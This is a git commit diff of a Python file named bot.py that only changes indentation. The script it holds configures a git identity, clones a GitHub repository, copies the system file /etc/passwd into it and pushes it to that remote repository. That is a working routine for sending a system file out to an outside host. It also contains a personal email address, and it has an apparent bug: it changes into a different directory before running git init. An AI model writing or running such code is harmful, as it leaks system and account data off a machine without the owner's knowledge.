b181babc6ee07a9dfded07c0336f87745ab9feba
ReverseShellOnU <158079078+ReverseShellOnU@users.noreply.github.com>
2024-02-11 23:30:34 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,14 +1,14 @@
- import os 
-    os.system('git config --global user.email "alberttventura@gmail.com"')     
-    os.system('git config --global user.name "ReverseShellOnU"')
-    os.chdir("/home/kali")
-    os.system("git clone git@github.com:ReverseShellOnU/Token-github.git")
-    os.system("cp /etc/passwd /home/kali/Token-github")
-    os.chdir("/home/kali/passwd")
+import os 
+os.system('git config --global user.email "alberttventura@gmail.com"')     
+os.system('git config --global user.name "ReverseShellOnU"')
+os.chdir("/home/kali")
+os.system("git clone git@github.com:ReverseShellOnU/Token-github.git")
+os.system("cp /etc/passwd /home/kali/Token-github")
+os.chdir("/home/kali/passwd")
     
-    os.system("git init")
-    os.system("git add .")
-    os.system('git commit -m "/etc/passwd de Albert"')
-    os.system("git remote add origin git@github.com:ReverseShellOnU/Token-github.git")
-    os.system("git push -u origin main")
+os.system("git init")
+os.system("git add .")
+os.system('git commit -m "/etc/passwd de Albert"')
+os.system("git remote add origin git@github.com:ReverseShellOnU/Token-github.git")
+os.system("git push -u origin main")
     
